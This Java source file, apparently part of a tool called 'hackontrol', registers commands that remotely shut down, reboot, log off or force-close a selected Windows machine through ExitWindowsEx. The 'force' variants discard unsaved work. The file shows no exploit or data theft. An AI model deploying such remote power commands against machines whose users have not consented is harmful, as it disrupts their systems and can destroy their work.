package com.khopan.hackontrol.command;

import com.khopan.hackontrol.source.CommandSource;
import com.khopan.win32.Win32;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;

public class PowerCommand implements Command {
	private static final long SHUTDOWN_REASON = Win32.SHTDN_REASON_MAJOR_SYSTEM | Win32.SHTDN_REASON_MINOR_PROCESSOR;

	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("power").requires(source -> source.isSelected()).then(LiteralArgumentBuilder.<CommandSource>literal("hybrid").executes(context -> {
			context.getSource().message("Hybrid shutdown");
			Win32.ExitWindowsEx(Win32.EWX_HYBRID_SHUTDOWN | Win32.EWX_SHUTDOWN, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("logoff").executes(context -> {
			context.getSource().message("Log off");
			Win32.ExitWindowsEx(Win32.EWX_LOGOFF, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("poweroff").executes(context -> {
			context.getSource().message("Power off");
			Win32.ExitWindowsEx(Win32.EWX_POWEROFF, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("reboot").executes(context -> {
			context.getSource().message("Reboot");
			Win32.ExitWindowsEx(Win32.EWX_REBOOT, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("restartapps").executes(context -> {
			context.getSource().message("Restart apps");
			Win32.ExitWindowsEx(Win32.EWX_RESTARTAPPS, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("shutdown").executes(context -> {
			context.getSource().message("Shutdown");
			Win32.ExitWindowsEx(Win32.EWX_SHUTDOWN, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("force").then(LiteralArgumentBuilder.<CommandSource>literal("hybrid").executes(context -> {
			context.getSource().message("Force hybrid shutdown");
			Win32.ExitWindowsEx(Win32.EWX_FORCE | Win32.EWX_HYBRID_SHUTDOWN | Win32.EWX_SHUTDOWN, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("logoff").executes(context -> {
			context.getSource().message("Force log off");
			Win32.ExitWindowsEx(Win32.EWX_FORCE | Win32.EWX_LOGOFF, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("poweroff").executes(context -> {
			context.getSource().message("Force power off");
			Win32.ExitWindowsEx(Win32.EWX_FORCE | Win32.EWX_POWEROFF, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("reboot").executes(context -> {
			context.getSource().message("Force reboot");
			Win32.ExitWindowsEx(Win32.EWX_FORCE | Win32.EWX_REBOOT, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("restartapps").executes(context -> {
			context.getSource().message("Force restart apps");
			Win32.ExitWindowsEx(Win32.EWX_FORCE | Win32.EWX_RESTARTAPPS, PowerCommand.SHUTDOWN_REASON);
			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("shutdown").executes(context -> {
			context.getSource().message("Force shutdown");
			Win32.ExitWindowsEx(Win32.EWX_FORCE | Win32.EWX_SHUTDOWN, PowerCommand.SHUTDOWN_REASON);
			return 1;
		}))));
	}
}
